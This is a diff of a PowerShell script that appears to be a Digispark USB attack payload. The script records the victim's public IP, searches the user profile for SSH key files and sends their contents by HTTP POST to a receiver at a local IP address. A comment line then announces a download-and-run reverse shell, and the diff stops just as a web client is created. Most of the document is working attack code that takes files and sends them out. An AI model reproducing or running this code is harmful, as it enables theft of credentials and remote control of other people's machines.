@@ -2,17 +2,23 @@
     # Get public IP
     $p = (Invoke-WebRequest https://api.ipify.org -UseBasicParsing | Select -Exp Content)
 
-    # Find id_* file
-    $f = Get-ChildItem $env:USERPROFILE -Recurse -Include 'plugins.yaml' -File -Force -ErrorAction SilentlyContinue | Select -First 1
-    if (-not $f) { $f = Get-Item "$env:USERPROFILE\plugins.yaml" -Force -ErrorAction SilentlyContinue }
-    if ($f) { $c = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue } else { $c = 'Not found' }
+    # Find id_*.pub file
+    $f = Get-ChildItem $env:USERPROFILE -Recurse -Include '*.pub' -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'id_*.pub' } | Select -First 1
 
-    # Send to receiver (Note: changed from 8000 to 8080 to match receiver.py)
+    if ($f) {
+        # Read the file content as a string (preserves newlines, etc.)
+        $content = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
+    } else {
+        $content = 'Not found'
+    }
+
+    # Send to receiver (using plain text body)
     $u = "http://192.168.137.5:8080/$env:COMPUTERNAME"
-    Invoke-WebRequest -UseBasicParsing -Method POST -Uri $u -Body $c -Headers @{
-        'X-Message'   = 'Hello from Digispark!'
+    $headers = @{
+        'X-Message'   = 'Jeeva Halal'
         'X-Public-IP' = $p
-    } -ErrorAction SilentlyContinue
+    }
+    Invoke-WebRequest -UseBasicParsing -Method POST -Uri $u -Body $content -Headers $headers -ErrorAction SilentlyContinue
 
     # Download and run reverse shell
     $wc = New-Object Net.WebClient
